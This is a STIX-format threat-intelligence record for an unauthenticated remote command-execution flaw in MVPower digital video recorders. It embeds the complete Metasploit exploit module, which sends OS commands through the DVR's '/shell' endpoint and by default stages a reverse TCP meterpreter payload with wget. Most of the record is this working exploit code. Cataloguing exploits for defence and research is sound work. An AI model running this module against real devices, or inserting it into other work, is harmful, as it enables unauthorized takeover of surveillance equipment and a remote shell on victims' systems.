{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57d70769-b1b1-4b44-9972-c4c2e414c96e",
    "created": "2024-08-14T17:01:53.777381Z",
    "modified": "2024-08-14T17:01:53.777385Z",
    "name": "MVPower DVR Shell Unauthenticated Command Execution",
    "description": " This module exploits an unauthenticated remote command execution vulnerability in MVPower digital video recorders. The 'shell' file on the web interface executes arbitrary operating system commands in the query string.  This module was tested successfully on a MVPower model TV-7104HE with firmware version 1.8.4 115215B9 (Build 2014/11/17).  The TV-7108HE model is also reportedly affected, but untested. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mvpower_dvr_shell_exec.rb",
            "external_id": "mvpower_dvr_shell_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentestpartners.com/blog/pwning-cctv-cameras/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  HttpFingerprint = { :pattern => [ /JAWS\\/1\\.0/ ] }\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'MVPower DVR Shell Unauthenticated Command Execution',\n      'Description' => %q{\n        This module exploits an unauthenticated remote command execution\n        vulnerability in MVPower digital video recorders. The 'shell' file\n        on the web interface executes arbitrary operating system commands in\n        the query string.\n\n        This module was tested successfully on a MVPower model TV-7104HE with\n        firmware version 1.8.4 115215B9 (Build 2014/11/17).\n\n        The TV-7108HE model is also reportedly affected, but untested.\n      },\n      'Author'      =>\n        [\n          'Paul Davies (UHF-Satcom)', # Initial vulnerability discovery and PoC\n          'Andrew Tierney (Pen Test Partners)', # Independent vulnerability discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'linux',\n      'References'  =>\n        [\n          # Comment from Paul Davies contains probably the first published PoC\n          [ 'URL', 'https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/' ],\n          # Writeup with PoC by Andrew Tierney from Pen Test Partners\n          [ 'URL', 'https://www.pentestpartners.com/blog/pwning-cctv-cameras/' ]\n        ],\n      'DisclosureDate' => '2015-08-23',\n      'Privileged'     => true, # BusyBox\n      'Arch'           => ARCH_ARMLE,\n      'DefaultOptions' =>\n        {\n          'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',\n          'CMDSTAGER::FLAVOR' => 'wget'\n        },\n      'Targets'        =>\n        [\n          ['Automatic', {}]\n        ],\n      'CmdStagerFlavor' => %w{ echo printf wget },\n      'DefaultTarget'   => 0))\n  end\n\n  def check\n    begin\n      fingerprint = Rex::Text::rand_text_alpha(rand(10) + 6)\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => '/shell',\n        'query' => \"echo+#{fingerprint}\",\n        'headers' => { 'Connection' => 'Keep-Alive' }\n      )\n      if res && res.body.include?(fingerprint)\n        return CheckCode::Vulnerable\n      end\n    rescue ::Rex::ConnectionError\n      return CheckCode::Unknown\n    end\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts)\n    begin\n      send_request_cgi(\n        'uri' => '/shell',\n        'query' => Rex::Text.uri_encode(cmd, 'hex-all'),\n        'headers' => { 'Connection' => 'Keep-Alive' }\n      )\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def exploit\n    print_status(\"#{peer} - Connecting to target\")\n\n    unless check == CheckCode::Vulnerable\n      fail_with(Failure::Unknown, \"#{peer} - Target is not vulnerable\")\n    end\n\n    print_good(\"#{peer} - Target is vulnerable!\")\n\n    execute_cmdstager(linemax: 1500)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-23",
    "x_mitre_platforms": [
        "linux'"
    ]
}